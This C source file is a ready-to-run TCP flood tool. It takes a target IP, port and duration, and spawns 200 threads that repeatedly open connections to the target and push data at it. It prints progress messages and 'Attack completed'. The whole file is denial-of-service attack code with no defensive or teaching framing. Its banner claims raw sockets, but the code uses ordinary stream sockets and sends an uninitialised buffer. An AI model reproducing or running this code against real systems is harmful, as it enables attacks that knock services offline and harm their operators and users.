#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <pthread.h>
#include <netinet/tcp.h>

#define MAX_THREADS 200
#define BUFFER_SIZE 1460

void *tcp_flood(void *arg) {
    char **args = (char **)arg;
    char *ip = args[0];
    int port = atoi(args[1]);
    int duration = atoi(args[2]);
    
    time_t start = time(NULL);
    unsigned long connections = 0;
    
    while(time(NULL) - start < duration) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if(sock < 0) continue;
        
        // Configurar socket para no bloquear
        int flags = 1;
        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &flags, sizeof(flags));
        setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &flags, sizeof(flags));
        
        struct sockaddr_in server_addr;
        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(port);
        inet_pton(AF_INET, ip, &server_addr.sin_addr);
        
        // Conectar (no esperar)
        connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr));
        
        // Enviar datos aleatorios
        char buffer[BUFFER_SIZE];
        for(int i = 0; i < 100; i++) { // Enviar 100 paquetes por conexión
            send(sock, buffer, BUFFER_SIZE, 0);
        }
        
        close(sock);
        connections++;
        
        if(connections % 1000 == 0) {
            printf("[TCP] Thread: %lu connections to %s:%d\n", connections, ip, port);
        }
    }
    
    return NULL;
}

int main(int argc, char *argv[]) {
    if(argc < 4) {
        printf("TCP Flood - High GBPS Raw Sockets\n");
        printf("Usage: %s <IP> <PORT> <TIME>\n", argv[0]);
        return 1;
    }
    
    printf("[TCP] Starting TCP Flood on %s:%d for %s seconds\n", argv[1], atoi(argv[2]), argv[3]);
    
    pthread_t threads[MAX_THREADS];
    
    for(int i = 0; i < MAX_THREADS; i++) {
        pthread_create(&threads[i], NULL, tcp_flood, argv + 1);
    }
    
    sleep(atoi(argv[3]));
    
    printf("[TCP] Attack completed\n");
    return 0;
}
